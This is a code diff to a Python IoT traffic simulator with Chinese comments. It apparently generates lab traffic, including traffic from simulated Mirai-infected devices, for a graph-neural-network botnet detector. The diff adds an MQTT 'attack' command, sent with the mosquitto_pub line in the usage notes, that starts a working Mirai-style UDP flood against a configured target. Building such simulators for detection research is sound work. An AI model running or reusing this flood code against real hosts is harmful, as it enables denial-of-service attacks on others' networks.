@@ -12,7 +12,11 @@
 
 运行：
     python virtual_device_generator.py                        # 全正常
-    python virtual_device_generator.py --attack plug-03       # 指定某台被感染（发 Mirai 洪水）
+    python virtual_device_generator.py --attack plug-03       # 启动时指定某台被感染
+
+运行时触发攻击（MQTT，与 ESP32 固件控制指令一致）：
+    mosquitto_pub -h 192.168.4.1 -t "community/plug-03/control" -m "attack"   # 触发攻击
+    mosquitto_pub -h 192.168.4.1 -t "community/plug-03/control" -m "block"    # 隔离/停止
 """
 
 import socket
@@ -119,8 +123,8 @@ def send_http(src_ip):
 
 # ==================== MQTT（真实协议，paho-mqtt） ====================
 
-def mqtt_loop(device_id, src_ip, stop):
-    """每台虚拟设备一个 MQTT 客户端，周期发布遥测。"""
+def mqtt_loop(device_id, src_ip, stop, attack_event):
+    """每台虚拟设备一个 MQTT 客户端：周期发布遥测 + 订阅控制指令（attack/normal/block）。"""
     try:
         import paho.mqtt.client as mqtt
     except ImportError:
@@ -128,11 +132,25 @@ def mqtt_loop(device_id, src_ip, stop):
         return
 
     client = mqtt.Client(client_id=device_id)
+
+    def on_message(client, userdata, msg):
+        topic = msg.topic
+        payload = msg.payload.decode('utf-8', errors='ignore').strip()
+        if topic == f'community/{device_id}/control':
+            if payload == 'attack':
+                attack_event.set()
+                print(f'[控制] {device_id} 进入攻击模式（模拟被感染）')
+            elif payload in ('normal', 'block'):
+                attack_event.clear()
+                print(f'[控制] {device_id} 恢复/隔离')
+
+    client.on_message = on_message
     try:
         client.connect(BROKER, BROKER_PORT, keepalive=60, bind_address=src_ip)
     except Exception as e:
         print(f'[MQTT] {device_id} 连接失败: {e}')
         return
+    client.subscribe(f'community/{device_id}/control')
     client.loop_start()
 
     while not stop.is_set():
@@ -170,28 +188,33 @@ def coap_listen(device_id, src_ip, stop):
 
 # ==================== 攻击模式（被感染设备） ====================
 
-def attack_worker(device_id, src_ip, stop):
-    """攻击模式：模拟被 Mirai 感染，向目标高频发 UDP 洪水。
+def attack_worker(device_id, src_ip, attack_event, stop):
+    """攻击线程（常驻）：attack_event 触发时向目标高频发 UDP 洪水。
 
     Mirai udpplain 特征：固定源端口 + 随机目的端口 + 高频，制造大量流，
-    使 GNN 能判出「僵尸网络(红)」。
+    使 GNN 能判出「僵尸网络(红)」。未触发时 idle，几乎不占资源。
     """
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind((src_ip, 0))  # 固定源端口（持久 socket，避免被误判成扫描）
-    print(f'[攻击] {device_id} ({src_ip}) 开始 Mirai UDP 洪水 -> {ATTACK_TARGET}')
     while not stop.is_set():
-        for _ in range(10):
-            dst_port = random.randint(1, 65535)  # 随机目的端口（Mirai udpplain 特征）
-            sock.sendto(b'\x00\x00\x00\x00', (ATTACK_TARGET, dst_port))
-        time.sleep(0.05)  # ~200 包/秒
+        if attack_event.is_set():
+            for _ in range(10):
+                dst_port = random.randint(1, 65535)  # 随机目的端口（Mirai udpplain 特征）
+                sock.sendto(b'\x00\x00\x00\x00', (ATTACK_TARGET, dst_port))
+            time.sleep(0.05)  # ~200 包/秒
+        else:
+            time.sleep(0.2)  # 未攻击时降低轮询频率
     sock.close()
 
 
 # ==================== 设备 worker ====================
 
 def device_worker(device_id, device_type, src_ip, listen_coap, coap_targets, is_attacker=False):
-    """一台虚拟设备的主循环：MQTT + DNS + NTP + HTTP + CoAP（+ 可选攻击）。"""
+    """一台虚拟设备的主循环：MQTT + DNS + NTP + HTTP + CoAP（+ 运行时攻击触发）。"""
     stop = threading.Event()
+    attack_event = threading.Event()  # 攻击触发标志（MQTT attack 指令设置）
+    if is_attacker:
+        attack_event.set()  # 启动时用 --attack 指定的设备立即开火
     threads = []
 
     # 持久 UDP socket：DNS/NTP/CoAP 共用，源端口固定
@@ -199,8 +222,8 @@ def device_worker(device_id, device_type, src_ip, listen_coap, coap_targets, is_
     udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     udp_sock.bind((src_ip, 0))
 
-    # MQTT 遥测（独立线程）
-    t = threading.Thread(target=mqtt_loop, args=(device_id, src_ip, stop), daemon=True)
+    # MQTT 遥测 + 控制订阅（独立线程）
+    t = threading.Thread(target=mqtt_loop, args=(device_id, src_ip, stop, attack_event), daemon=True)
     t.start()
     threads.append(t)
 
@@ -210,11 +233,10 @@ def device_worker(device_id, device_type, src_ip, listen_coap, coap_targets, is_
         t.start()
         threads.append(t)
 
-    # 攻击模式（被感染设备额外发 Mirai 洪水）
-    if is_attacker:
-        t = threading.Thread(target=attack_worker, args=(device_id, src_ip, stop), daemon=True)
-        t.start()
-        threads.append(t)
+    # 攻击线程（常驻，attack_event 触发时才发洪水）
+    t = threading.Thread(target=attack_worker, args=(device_id, src_ip, attack_event, stop), daemon=True)
+    t.start()
+    threads.append(t)
 
     # 主循环：周期发 DNS/NTP/HTTP/CoAP（带随机抖动）
     try:
